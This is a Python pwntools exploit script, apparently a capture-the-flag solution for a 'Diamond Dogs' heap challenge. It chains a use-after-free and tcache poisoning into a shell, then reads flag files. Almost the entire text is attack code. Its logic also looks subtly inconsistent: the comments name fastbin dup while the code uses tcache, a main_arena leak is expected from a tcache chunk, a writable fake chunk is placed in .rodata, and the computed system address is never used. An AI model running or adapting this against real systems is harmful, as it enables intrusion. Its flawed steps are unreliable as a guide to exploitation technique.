#!/usr/bin/env python3
# Diamond Dogs: UAF on released dog -> fastbin dup -> fake chunk in .rodata
# -> controlled kennel pointer -> command*(dog) = system("sh")
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

HOST, PORT = 'diamond-dogs.chal.csaw.io', 1025

# fake chunk location in .rodata (vaddr 0x402000 == file offset 0x3000,
# so file_off = vaddr - 0x102000; text starts at file offset 0x1000 = vaddr 0x401000)
FAKE_OFF = 0x2A98          # aligned-16 spot inside the big string blob
FAKE_VA  = FAKE_OFF + 0x102000   # 0x404A98, file_off <= 0x3030 -> in bounds
print('# fake chunk vaddr = %#x' % FAKE_VA)

RECORD = ('AAAAAAAA' * 17 +
          p64(FAKE_VA) +        # +0x80 : rw-p side
          p64(FAKE_VA) +        # +0x88 : x-exe side
          p64(0x401256) +       # +0x90 : callback ("sh")
          p64(0x401256) +       # +0x98 : callback
          b'/bin/sh\0' +        # +0xA0 : arg (= user pointer)
          b'\0' * 0x18).ljust(0x110, b'B')   # +0xB8 leftover data, records 1+2

def menu(choice):
    p.recvuntil(b'go home\n> ' if False else b'7) go home\n')
    p.send(str(choice).encode() + b'\n')

def adopt(k, name=b'x'):
    menu(1)
    p.sendlineafter(b'kennel: ', str(k).encode())
    p.sendafter(b'name: ', name.ljust(0x18, b'\0'))

def release(k):
    menu(3)
    p.sendlineafter(b'kennel: ', str(k).encode())

def command(k):
    menu(2)
    p.sendlineafter(b'kennel: ', str(k).encode())

def note(k, size, data):
    menu(4)
    p.sendlineafter(b'slot: ', str(k).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'contents: ', data)

def readnote(k):
    menu(5)
    p.sendlineafter(b'slot: ', str(k).encode())
    return p.recvn(8)

def shred(k):
    menu(6)
    p.sendlineafter(b'slot: ', str(k).encode())

p = remote(HOST, PORT)

# ---- 1. libc leak ----
adopt(0)                       # dog0
adopt(1)                       # guard
release(0)                     # dog0 -> tcache 0x30
command(1)                     # print bark ptr == &woof (sanity)
p.recvuntil(b'says: ')
dog0_va = u64(p.recvn(6).ljust(8, b'\0'))
log.success('dog0 = %#x' % dog0_va)

# note0 lands exactly on the freed dog0, notes[0].sz = 0x20 read
note(0, 0x20, RECORD[:0x20])
leak = u64(readnote(0).ljust(8, b'\0'))
log.success('main_arena+96 = %#x' % leak)
libc_base = leak - 0x1ecbe0
log.success('libc base   = %#x' % libc_base)
assert libc_base & 0xfff == 0
system = libc_base + 0x055410
log.info('system = %#x' % system)

# note1 -> tcache 0x30 head (was dog0) : fake chunk metadata
note(1, 0x20, p64(0) + p64(FAKE_VA))
# note2 -> tcache 0x30 head
note(2, 0x20, b'Q' * 0x20)

# ---- 2. tcache poison into .rodata ----
adopt(2)                       # takes note2 slot
adopt(3)                       # takes note1 slot -> writes FAKE_VA into fd
adopt(4)                       # malloc returns FAKE_VA-0x10 (in .rodata)
adopt(5, name=b'/bin/sh\0'.ljust(0x18, b'\0'))   # user pointer @ FAKE_VA+0x10
shred(5)

# ---- 3. 0x110 records fill the hole, fake dog header overwrites it ----
note(3, 0x110, RECORD)
note(4, 0x110, RECORD)

# ---- 4. fire ----
menu(2)
p.sendlineafter(b'kennel: ', b'5')
sleep(0.5)
p.sendline(b'echo PWNED; cat /flag* /home/*/flag* 2>/dev/null; id')
p.interactive()
